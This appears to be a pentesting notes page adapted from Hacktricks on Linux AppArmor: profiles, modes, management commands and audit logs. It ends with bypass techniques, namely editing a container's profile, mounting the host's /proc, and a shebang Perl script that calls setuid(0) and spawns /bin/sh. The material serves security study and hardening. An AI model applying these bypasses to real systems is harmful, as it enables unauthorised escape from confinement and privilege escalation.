---
title: AppArmor 🛡️
---
> *Credits to [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor)*

![](Pasted%20image%2020241113112959.png)

## Basic Information

AppArmor is a **kernel enhancement designed to restrict the resources available to programs through per-program profiles**, effectively implementing Mandatory Access Control (MAC) by tying access control attributes directly to programs instead of users. This system operates by **loading profiles into the kernel**, usually during boot, and these profiles dictate what resources a program can access, such as network connections, raw socket access, and file permissions.

There are two operational modes for AppArmor profiles:

- **Enforcement Mode**: This mode actively enforces the policies defined within the profile, blocking actions that violate these policies and logging any attempts to breach them through systems like syslog or auditd.
- **Complain Mode**: Unlike enforcement mode, complain mode does not block actions that go against the profile's policies. Instead, it logs these attempts as policy violations without enforcing restrictions.

### Components of AppArmor

- **Kernel Module**: Responsible for the enforcement of policies.
- **Policies**: Specify the rules and restrictions for program behavior and resource access.
- **Parser**: Loads policies into the kernel for enforcement or reporting.
- **Utilities**: These are user-mode programs that provide an interface for interacting with and managing AppArmor.

### Profiles path

Apparmor profiles are usually saved in `/etc/apparmor.d/` With `sudo aa-status` you will be able to list the binaries that are restricted by some profile. If you can change the char "/" for a dot of the path of each listed binary and you will obtain the name of the apparmor profile inside the mentioned folder.

For example, a **apparmor** profile for `/usr/bin/man` will be located in `/etc/apparmor.d/usr.bin.man`

### Commands

```shell
aa-status     #check the current status 
aa-enforce    #set profile to enforce mode (from disable or complain)
aa-complain   #set profile to complain mode (from diable or enforcement)
apparmor_parser #to load/reload an altered policy
aa-genprof    #generate a new profile
aa-logprof    #used to change the policy when the binary/program is changed
aa-mergeprof  #used to merge the policies
```

## Logs

Example of **AUDIT** and **DENIED** logs from `/var/log/audit/audit.log` of the executable `**service_bin**`:

```shell
type=AVC msg=audit(1610061880.392:286): apparmor="AUDIT" operation="getattr" profile="/bin/rcat" name="/dev/pts/1" pid=954 comm="service_bin" requested_mask="r" fsuid=1000 ouid=1000
type=AVC msg=audit(1610061880.392:287): apparmor="DENIED" operation="open" profile="/bin/rcat" name="/etc/hosts" pid=954 comm="service_bin" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
```

You can also get this information using:

```shell
sudo aa-notify -s 1 -v
Profile: /bin/service_bin
Operation: open
Name: /etc/passwd
Denied: r
Logfile: /var/log/audit/audit.log

Profile: /bin/service_bin
Operation: open
Name: /etc/hosts
Denied: r
Logfile: /var/log/audit/audit.log

AppArmor denials: 2 (since Wed Jan  6 23:51:08 2021)
For more information, please see: https://wiki.ubuntu.com/DebuggingApparmor
```

### AppArmor Docker Bypass1

You can find which **apparmor profile is running a container** using:

```shell
docker inspect 9d622d73a614 | grep lowpriv
        "AppArmorProfile": "lowpriv",
                "apparmor=lowpriv"
```

Then, you can run the following line to **find the exact profile being used**:

```shell
find /etc/apparmor.d/ -name "*lowpriv*" -maxdepth 1 2>/dev/null
```

In the weird case you can **modify the apparmor docker profile and reload it.** You could remove the restrictions and "bypass" them.

### AppArmor Docker Bypass2

**AppArmor is path based**, this means that even if it might be **protecting** files inside a directory like `**/proc**` if you can **configure how the container is going to be run**, you could **mount** the proc directory of the host inside `**/host/proc**` and it **won't be protected by AppArmor anymore**.

### AppArmor Shebang Bypass

In [**this bug**](https://bugs.launchpad.net/apparmor/+bug/1911431) you can see an example of how **even if you are preventing perl to be run with certain resources**, if you just create a a shell script **specifying** in the first line `**#!/usr/bin/perl**` and you **execute the file directly**, you will be able to execute whatever you want. E.g.:

```shell
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```